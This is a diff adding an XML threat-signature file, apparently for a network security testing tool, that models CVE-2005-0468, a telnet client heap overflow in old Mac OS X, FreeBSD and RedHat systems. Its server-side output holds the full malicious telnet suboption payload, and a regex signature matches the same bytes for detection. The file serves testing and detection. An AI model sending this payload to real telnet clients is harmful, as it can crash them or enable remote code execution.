@@ -1,0 +1,94 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Telnet Heap Overflow Attack (IPv6 Version)"/>
+    <EngDesc display="true" value="This attack is a crash which can be potentially used to cause remote code execution on a host connecting with telnet.  This threat is a client attack that comes from the virtual server. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol display="true" value="Telnet/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Apple"/>
+      <item value="FreeBSD"/>
+      <item value="RedHat"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Apple_Mac_OS_X"/>
+      <item value="FreeBSD"/>
+      <item value="RedHat"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Apple_Mac_OS_X_10.3.8"/>
+      <item value="FreeBSD_5.3"/>
+      <item value="RedHat_9.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/bid/12919"/>
+    <CVEID display="true" value="CVE-2005-0468"/>
+    <bugtraqID display="true" value="12919"/>
+    <OSVDB display="true" value="15093"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="19e7d4d5f435c4c225a5660ba4cb1070"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1211994066"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="C"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\XFF\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFA\X22\X03\XFF\XFF\X03\X03\XFF\XF0"/>
+    <Created value="1139462505" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="G"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="H"/>
+    <NamedVar name="TELNETdestPort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+    <for index="C"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026, 65535)" destPort="$TELNETdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="FFFD03FFFB18FFFB1FFFFB20FFFB21FFFB22FFFB27FFFD05FFFB23" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="C" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="FFFA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FA2203FFFF0303FFF0" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
